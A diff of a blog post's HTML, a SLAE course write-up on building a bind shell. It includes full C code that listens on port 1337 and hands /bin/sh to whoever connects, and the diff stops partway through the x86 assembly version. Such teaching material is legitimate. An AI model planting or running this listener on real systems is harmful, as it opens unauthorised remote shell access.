@@ -1,87 +1,4 @@
-<!doctype html><html lang=en><head>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta charset=utf-8>
-<meta content="utf-8" http-equiv=encoding>
-<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
-<link rel=stylesheet href=/css/grid.css type=text/css>
-<link rel=stylesheet href=/css/highlight.css type=text/css>
-<link rel=stylesheet href=/css/main.css type=text/css>
-<meta name=apple-mobile-web-app-title content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
-<meta name=twitter:site content="@dubs3c">
-<meta name=twitter:creator content="@dubs3c">
-<meta property="og:title" content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly">
-<meta name=twitter:title content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly">
-<meta itemprop=name content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly">
-<meta name=application-name content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly">
-<meta property="og:site_name" content="dubell.io">
-<meta property="og:article:published_time" content="2020-01-20T13:33:37Z">
-<meta property="article:published_time" content="2020-01-20T13:33:37Z">
-<base href=/www/slae-1-bind_shell/>
-<link rel=canonical href=/www/slae-1-bind_shell/ itemprop=url>
-<meta name=url content="/www/slae-1-bind_shell/">
-<meta name=twitter:url content="/www/slae-1-bind_shell/">
-<meta property="og:url" content="/www/slae-1-bind_shell/">
-<meta property="og:article:author" content="Dubs3c">
-<meta property="article:author" content="Dubs3c">
-<meta name=author content="Dubs3c">
-<meta name=description content="Bind shell">
-<meta itemprop=description content="Bind shell">
-<meta property="og:description" content="Bind shell">
-<meta name=twitter:description content="Bind shell">
-<meta itemprop=image content="/img/hacker2.jpg">
-<meta property="og:image" content="/img/hacker2.jpg">
-<meta name=twitter:image content="/img/hacker2.jpg">
-<meta name=twitter:image:src content="/img/hacker2.jpg">
-<meta property="og:updated_time" content="2020-01-20T13:33:37Z">
-<link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml>
-<title>dubell.io | SLAE 1: Creating a bind shell in x86 Assembly</title>
-</head><body>
-<div id=particles-js></div>
-<main><div class=row>
-<header class="col center">
-<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
-</div>
-</div>
-<div class=row>
-<div class="col center">
-<nav>
-<fieldset>
-<legend>n4vig4ti0n</legend>
-<ul>
-<li><a href=/>/etc/motd</a></li>
-<li><a href=/www/>/var/www</a></li>
-<li><a href=/mnt/>/mnt</a></li>
-<li><a href=/usr/>/usr</a></li>
-</ul>
-</fieldset>
-</nav>
-</div>
-</div>
-<div class=content>
-<article>
-<h1>SLAE 1: Creating a bind shell in x86 Assembly</h1>
-<br>
-<p class=small style=color:#999>
-<a href=/categories/programming>Programming</a> / January 20, 2020 • 18 min read </p>
-<p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a> </p>
-<br>
-<p><strong>What is a bind shell?</strong></p>
-<p>A Bind shell is simply a program that listens for incoming connections. When a connection is made, a local shell is redirected to the newly created connection, thereby giving access to the local machine. Bind shells are usually created for backdoor access, although they could also be used for legitimate purposes, e.g. system administration.</p>
-<h2 id=ok-nuff-said-lets-boogie>ok, nuff said, let&rsquo;s boogie</h2>
-<p>Our program will follow these steps:</p>
-<ol>
-<li>Create a socket</li>
-<li>Bind the socket</li>
-<li>Listen for connections</li>
-<li>Accept new connections</li>
-<li>Execute shell</li>
-</ol>
-<p>Before I solved this assignment, I wrote a version in C (with the help of my old university books), see below:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/highlight.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly"><meta name=twitter:title content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly"><meta itemprop=name content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly"><meta name=application-name content="dubell.io | SLAE 1: Creating a bind shell in x86 Assembly"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-20T13:33:37Z"><meta property="article:published_time" content="2020-01-20T13:33:37Z"><base href=/www/slae-1-bind_shell/><link rel=canonical href=/www/slae-1-bind_shell/ itemprop=url><meta name=url content="/www/slae-1-bind_shell/"><meta name=twitter:url content="/www/slae-1-bind_shell/"><meta property="og:url" content="/www/slae-1-bind_shell/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Bind shell"><meta itemprop=description content="Bind shell"><meta property="og:description" content="Bind shell"><meta name=twitter:description content="Bind shell"><meta itemprop=image content="/img/hacker2.jpg"><meta property="og:image" content="/img/hacker2.jpg"><meta name=twitter:image content="/img/hacker2.jpg"><meta name=twitter:image:src content="/img/hacker2.jpg"><meta property="og:updated_time" content="2020-01-20T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml><title>dubell.io | SLAE 1: Creating a bind shell in x86 Assembly</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>SLAE 1: Creating a bind shell in x86 Assembly</h1><br><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 20, 2020 • 18 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p><br><p><strong>What is a bind shell?</strong></p><p>A Bind shell is simply a program that listens for incoming connections. When a connection is made, a local shell is redirected to the newly created connection, thereby giving access to the local machine. Bind shells are usually created for backdoor access, although they could also be used for legitimate purposes, e.g. system administration.</p><h2 id=ok-nuff-said-lets-boogie>ok, nuff said, let&rsquo;s boogie</h2><p>Our program will follow these steps:</p><ol><li>Create a socket</li><li>Bind the socket</li><li>Listen for connections</li><li>Accept new connections</li><li>Execute shell</li></ol><p>Before I solved this assignment, I wrote a version in C (with the help of my old university books), see below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -124,71 +41,56 @@
 </span><span class=lnt>41
 </span><span class=lnt>42
 </span><span class=lnt>43
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;netinet/in.h&gt;</span><span class=cp>
-</span><span class=cp></span>
-<span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
-
-    <span class=kt>int</span> <span class=n>listenfd</span><span class=p>,</span> <span class=n>connfd</span><span class=p>;</span>
-    <span class=n>socklen_t</span> <span class=n>len</span><span class=p>;</span>
-    <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>serveraddr</span><span class=p>,</span> <span class=n>cliaddr</span><span class=p>;</span>
-
-    <span class=c1>// Create a listen file descriptor
-</span><span class=c1></span>    <span class=n>listenfd</span> <span class=o>=</span> <span class=n>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-
-    <span class=c1>// Configure our server
-</span><span class=c1></span>    <span class=n>serveraddr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
-    <span class=n>serveraddr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span> <span class=o>=</span> <span class=n>htonl</span><span class=p>(</span><span class=n>INADDR_ANY</span><span class=p>);</span>
-    <span class=n>serveraddr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=n>htons</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
-
-    <span class=c1>// Bind the configured socket to our listendfd file descriptor
-</span><span class=c1></span>    <span class=n>bind</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span><span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>serveraddr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>serveraddr</span><span class=p>));</span>
-
-    <span class=c1>// Listen on port 1337 on any address, allow a backlog of 2 connections
-</span><span class=c1></span>    <span class=n>listen</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
-
-    <span class=c1>// Block until connection is made
-</span><span class=c1></span>    <span class=n>connfd</span> <span class=o>=</span> <span class=n>accept</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
-
-    <span class=c1>// Point the file descriptors STDIN,STDOUT,STDERR
-</span><span class=c1></span>    <span class=c1>// to the new file descriptor created for the new connection
-</span><span class=c1></span>    <span class=n>dup2</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-    <span class=n>dup2</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
-    <span class=n>dup2</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
-
-    <span class=c1>// Execute local program /bin/sh
-</span><span class=c1></span>    <span class=n>execv</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
-
-    <span class=c1>// Close file descriptors
-</span><span class=c1></span>    <span class=n>close</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span>
-    <span class=n>close</span><span class=p>(</span><span class=n>listenfd</span><span class=p>);</span>
-
-    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>My idea was to disassemble the C version in order to better understand the underlying <code>syscalls</code> being made. However, I did not learn anything special from it. Instead, I used it as a reference point when writing in assembly.</p>
-<p>Having programmed networked applications in C before, I know the syscalls that I am interested in are:</p>
-<ul>
-<li>socket</li>
-<li>bind</li>
-<li>listen</li>
-<li>accept</li>
-</ul>
-<p>However these syscalls were not all present in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> which confused me a bit. My research told me it was because I was using a very old Ubuntu version:</p>
-<pre tabindex=0><code>Linux slae 3.5.0-51-generic #76-Ubuntu SMP Thu May 15 21:19:44 UTC 2014 i686 i686 i686 GNU/Linux
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;netinet/in.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>listenfd</span><span class=p>,</span> <span class=n>connfd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>socklen_t</span> <span class=n>len</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>serveraddr</span><span class=p>,</span> <span class=n>cliaddr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Create a listen file descriptor
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>listenfd</span> <span class=o>=</span> <span class=n>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Configure our server
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>serveraddr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>serveraddr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span> <span class=o>=</span> <span class=n>htonl</span><span class=p>(</span><span class=n>INADDR_ANY</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>serveraddr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=n>htons</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Bind the configured socket to our listendfd file descriptor
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>bind</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span><span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>serveraddr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>serveraddr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Listen on port 1337 on any address, allow a backlog of 2 connections
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>listen</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Block until connection is made
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>connfd</span> <span class=o>=</span> <span class=n>accept</span><span class=p>(</span><span class=n>listenfd</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Point the file descriptors STDIN,STDOUT,STDERR
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// to the new file descriptor created for the new connection
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>dup2</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>dup2</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>dup2</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Execute local program /bin/sh
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>execv</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Close file descriptors
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>close</span><span class=p>(</span><span class=n>connfd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>listenfd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>My idea was to disassemble the C version in order to better understand the underlying <code>syscalls</code> being made. However, I did not learn anything special from it. Instead, I used it as a reference point when writing in assembly.</p><p>Having programmed networked applications in C before, I know the syscalls that I am interested in are:</p><ul><li>socket</li><li>bind</li><li>listen</li><li>accept</li></ul><p>However these syscalls were not all present in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> which confused me a bit. My research told me it was because I was using a very old Ubuntu version:</p><pre tabindex=0><code>Linux slae 3.5.0-51-generic #76-Ubuntu SMP Thu May 15 21:19:44 UTC 2014 i686 i686 i686 GNU/Linux
 
 Distributor ID: Ubuntu
 Description:    Ubuntu 12.10
 Release:        12.10
 Codename:       quantal
-</code></pre><p>Instead I should use a wrapper syscall called <code>socketcall</code> in order to access the socket calls I am interested in.</p>
-<p>Running <code>man 2 socketcall</code> revealed:</p>
-<pre tabindex=0><code>SOCKETCALL(2)                                                   Linux Programmer's Manual                                                  SOCKETCALL(2)
+</code></pre><p>Instead I should use a wrapper syscall called <code>socketcall</code> in order to access the socket calls I am interested in.</p><p>Running <code>man 2 socketcall</code> revealed:</p><pre tabindex=0><code>SOCKETCALL(2)                                                   Linux Programmer&#39;s Manual                                                  SOCKETCALL(2)
 
 NAME
        socketcall - socket system calls
@@ -202,8 +104,7 @@ DESCRIPTION
 
        User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel  hackers  need  to  know
        about socketcall().
-</code></pre><p>The first parameter is the syscall we want, the second parameter is the arguments for that syscall. We can find the correct syscall numbers here <code>/usr/include/linux/net.h</code>:</p>
-<pre tabindex=0><code>#define SYS_SOCKET      1               /* sys_socket(2)                */
+</code></pre><p>The first parameter is the syscall we want, the second parameter is the arguments for that syscall. We can find the correct syscall numbers here <code>/usr/include/linux/net.h</code>:</p><pre tabindex=0><code>#define SYS_SOCKET      1               /* sys_socket(2)                */
 #define SYS_BIND        2               /* sys_bind(2)                  */
 #define SYS_CONNECT     3               /* sys_connect(2)               */
 #define SYS_LISTEN      4               /* sys_listen(2)                */
@@ -223,8 +124,7 @@ DESCRIPTION
 #define SYS_ACCEPT4     18              /* sys_accept4(2)               */
 #define SYS_RECVMMSG    19              /* sys_recvmmsg(2)              */
 #define SYS_SENDMMSG    20              /* sys_sendmmsg(2)              */
-</code></pre><p>So if we wanted to use <code>bind()</code> we would do <code>socketcall(2, *args)</code>. Before we do that though, we need the correct syscall for <code>socketcall</code>, we can find that in the same file:</p>
-<pre tabindex=0><code>[...]
+</code></pre><p>So if we wanted to use <code>bind()</code> we would do <code>socketcall(2, *args)</code>. Before we do that though, we need the correct syscall for <code>socketcall</code>, we can find that in the same file:</p><pre tabindex=0><code>[...]
 #define __NR_fstatfs 100
 #define __NR_ioperm 101
 #define __NR_socketcall 102
@@ -232,12 +132,7 @@ DESCRIPTION
 #define __NR_setitimer 104
 #define __NR_getitimer 105
 [...]
-</code></pre><p>Great, now we know how to use the wrapper in order perform our system calls.</p>
-<h3 id=creating-a-socket>Creating a socket</h3>
-<p>Our code begins by creating a socket as I did in the C version:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>Great, now we know how to use the wrapper in order perform our system calls.</p><h3 id=creating-a-socket>Creating a socket</h3><p>Our code begins by creating a socket as I did in the C version:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -253,29 +148,23 @@ DESCRIPTION
 </span><span class=lnt>14
 </span><span class=lnt>15
 </span><span class=lnt>16
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>
-
-<span class=k>section</span> <span class=nv>.text</span>
-<span class=nl>_start:</span>
-
-    <span class=c1>; zero out registers</span>
-    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
-    <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>
-    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
-
-    <span class=c1>; -------------------------------------</span>
-    <span class=c1>; # Setup socket</span>
-    
-    <span class=c1>; socketcall()</span>
-    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; __NR_socketcall 102</span>
-    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; SYS_SOCKET</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>The code begins by XOR:ing eax, ebx and edx by itself, this is to avoid any garbage data. Then we setup the <code>socketcall</code> by placing 102 in $eax (0x66 in hex) which indicates the system call we want to perform, then we place 1 <code>(SYS_SOCKET)</code> in ebx which is the first parameter for <code>socketcall</code>. When performing system calls, <code>eax</code> is usually the register that stores the syscall to perform while <code>ebx, ecx, edx</code> is the first, second and third parameter for that syscall.</p>
-<p>Next step is to setup the arguments for running <code>SYS_SOCKET</code>. Running <code>man 2 socket</code> tells us what the function expects:</p>
-<pre tabindex=0><code>SOCKET(2)                                     Linux Programmer's Manual                                     SOCKET(2)
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=k>global</span> <span class=nv>_start</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>section</span> <span class=nv>.text</span>
+</span></span><span class=line><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; zero out registers</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>; -------------------------------------</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; # Setup socket</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>; socketcall()</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x66</span>     <span class=c1>; __NR_socketcall 102</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x1</span>      <span class=c1>; SYS_SOCKET</span>
+</span></span></code></pre></td></tr></table></div></div><p>The code begins by XOR:ing eax, ebx and edx by itself, this is to avoid any garbage data. Then we setup the <code>socketcall</code> by placing 102 in $eax (0x66 in hex) which indicates the system call we want to perform, then we place 1 <code>(SYS_SOCKET)</code> in ebx which is the first parameter for <code>socketcall</code>. When performing system calls, <code>eax</code> is usually the register that stores the syscall to perform while <code>ebx, ecx, edx</code> is the first, second and third parameter for that syscall.</p><p>Next step is to setup the arguments for running <code>SYS_SOCKET</code>. Running <code>man 2 socket</code> tells us what the function expects:</p><pre tabindex=0><code>SOCKET(2)                                     Linux Programmer&#39;s Manual                                     SOCKET(2)
 
 NAME
        socket - create an endpoint for communication
@@ -318,14 +207,12 @@ DESCRIPTION
        protocol numbers.
 
        [...]
-</code></pre><p>The first parameter expects an int that indicates which family to use, this can be found in: <code>/usr/include/i386-linux-gnu/bits/socket.h</code>:</p>
-<pre tabindex=0><code>[...]
+</code></pre><p>The first parameter expects an int that indicates which family to use, this can be found in: <code>/usr/include/i386-linux-gnu/bits/socket.h</code>:</p><pre tabindex=0><code>[...]
 #define PF_INET         2       /* IP protocol family.  */
 [...]
 #define AF_INET         PF_INET
 [...]
-</code></pre><p><code>AF_INET = 2</code>, great! The <code>type</code> parameter can be found in the same file:</p>
-<pre tabindex=0><code>/* Types of sockets.  */
+</code></pre><p><code>AF_INET = 2</code>, great! The <code>type</code> parameter can be found in the same file:</p><pre tabindex=0><code>/* Types of sockets.  */
 enum __socket_type
 {
   SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
@@ -334,10 +221,7 @@ enum __socket_type
   SOCK_DGRAM = 2,               /* Connectionless, unreliable datagrams
                                    of fixed maximum length.  */
 [...]
-</code></pre><p>Because we want to use TCP, we should use <code>SOCK_STREAM</code>. The end result looks like this:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</code></pre><p>Because we want to use TCP, we should use <code>SOCK_STREAM</code>. The end result looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -345,27 +229,15 @@ enum __socket_type
 </span><span class=lnt>6
 </span><span class=lnt>7
 </span><span class=lnt>8
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm>    <span class=c1>; # Setup socket</span>
-    <span class=c1>; Resulting file descriptor is saved to eax</span>
-    <span class=nf>push</span> <span class=nb>edx</span>
-    <span class=nf>push</span> <span class=mh>0x1</span>
-    <span class=nf>push</span> <span class=mh>0x2</span>
-    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Arguments are located top of the stack</span>
-    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel it&#39;s time to boogie</span>
-    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax contains the file descriptor created by socket(), store it in $edi for now</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>The arguments for <code>socket()</code> are pushed to the stack, $esp which points to the top of the stack is then copied to $ecx which will be the second parameter for <code>socketcall()</code>.</p>
-<blockquote>
-<p><strong>Cool tip</strong></p>
-<p>In order to find information about syscalls and their parameters, running <code>grep -ir "SOCK_STREAM" .</code> in <code>/usr/include/</code> can give you a lot of information.</p>
-</blockquote>
-<h3 id=binding-our-socket>Binding our socket</h3>
-<p>We have created the socket, now it&rsquo;s time to <em>bind</em> it. This means <code>bind()</code> will assign the address and port to the socket referred to by the file descriptor created by <code>socket()</code> in the previous section.</p>
-<p>As always, we run <code>man 2 bind</code>, which gives us:</p>
-<pre tabindex=0><code>BIND(2)                                                            Linux Programmer's Manual                                                            BIND(2)
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl>    <span class=c1>; # Setup socket</span>
+</span></span><span class=line><span class=cl>    <span class=c1>; Resulting file descriptor is saved to eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=nb>edx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x1</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mh>0x2</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>     <span class=c1>; Arguments are located top of the stack</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mh>0x80</span>         <span class=c1>; Tell the kernel it&#39;s time to boogie</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>edi</span><span class=p>,</span> <span class=nb>eax</span>     <span class=c1>; $eax contains the file descriptor created by socket(), store it in $edi for now</span>
